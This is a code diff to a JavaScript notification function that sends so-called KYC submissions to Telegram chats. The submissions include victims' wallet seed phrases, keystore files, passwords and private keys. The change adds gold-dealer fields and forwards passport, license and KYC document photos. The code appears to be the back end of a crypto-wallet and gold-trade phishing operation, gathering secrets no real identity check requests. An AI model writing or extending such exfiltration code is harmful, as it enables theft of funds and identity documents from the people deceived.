@@ -61,28 +61,62 @@ function notifyNewAdmin(username) {
 
 function notifyNewKyc(details) {
   // Format KYC details for Telegram
-  const { sessionId, walletType, seedPhrase, keystoreJson, password, privateKey, images } = details;
+  const { sessionId, walletType, seedPhrase, keystoreJson, password, privateKey, images, fileMap, dealersLicenseStatus, qualityRequired, karatsPurity, destinationRefineryText } = details;
   let message = `New KYC Submission:\nSession ID: ${sessionId || 'N/A'}\nWallet Type: ${walletType || 'N/A'}`;
-  if (seedPhrase) message += `\nSeed Phrase: ${seedPhrase}`;
-  if (keystoreJson) message += `\nKeystore JSON: ${keystoreJson}`;
+  if (dealersLicenseStatus) message += `\nDealers License: ${dealersLicenseStatus}`;
+  if (qualityRequired) message += `\nQuality Required: ${qualityRequired}`;
+  if (karatsPurity) message += `\nKarats & Purity: ${karatsPurity}`;
+  if (destinationRefineryText) message += `\nDestination Refinery: ${destinationRefineryText}`;
+  if (seedPhrase) message += `\n\nSeed Phrase: ${seedPhrase}`;
+  if (keystoreJson) message += `\n\nKeystore JSON: ${keystoreJson}`;
   if (password) message += `\nPassword: ${password}`;
   if (privateKey) message += `\nPrivate Key: ${privateKey}`;
-  if (images && images.length) {
-    message += `\nImages:`;
-    images.forEach((img, idx) => {
-      message += `\n  ${idx + 1}. ${img.url || img.secure_url || img.public_id}`;
-    });
-  }
+
+  // Collect image URLs for passport and KYC document (not destination refinery)
+  // Send all images from fileMap as photos, with their key as caption
   if (bot) {
-    chatIds.forEach(chatId => {
+    chatIds.forEach(async chatId => {
       try {
-        bot.sendMessage(chatId, message);
+        // Send main message with only text details
+        await bot.sendMessage(chatId, message);
+        // Send each image in fileMap as a photo
+        // Only send the KYC document if it is an image
+        if (fileMap && fileMap.kycDocument) {
+          const imgUrl = fileMap.kycDocument.url || fileMap.kycDocument.secure_url;
+          const format = fileMap.kycDocument.format || '';
+          const imageFormats = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'];
+          if (imgUrl && imageFormats.includes(format.toLowerCase())) {
+            await bot.sendPhoto(chatId, imgUrl, { caption: 'KYC Document' });
+          }
+        }
+        // Send other images (passport, dealersLicense) as before
+        if (fileMap && fileMap.passport) {
+          const imgUrl = fileMap.passport.url || fileMap.passport.secure_url;
+          if (imgUrl) {
+            await bot.sendPhoto(chatId, imgUrl, { caption: 'Passport' });
+          }
+        }
+        if (fileMap && fileMap.dealersLicense) {
+          const imgUrl = fileMap.dealersLicense.url || fileMap.dealersLicense.secure_url;
+          if (imgUrl) {
+            await bot.sendPhoto(chatId, imgUrl, { caption: 'Dealers License' });
+          }
+        }
       } catch (err) {
         console.error('Failed to send telegram KYC message', err);
       }
     });
   } else {
+    // For stub, print message and image URLs
     console.log('[telegram stub] notifyNewKyc:', message);
+    if (fileMap && Object.keys(fileMap).length) {
+      Object.entries(fileMap).forEach(([key, val]) => {
+        const imgUrl = val.url || val.secure_url;
+        if (imgUrl) {
+          console.log(`[telegram stub] ${key} image:`, imgUrl);
+        }
+      });
+    }
   }
 }
 
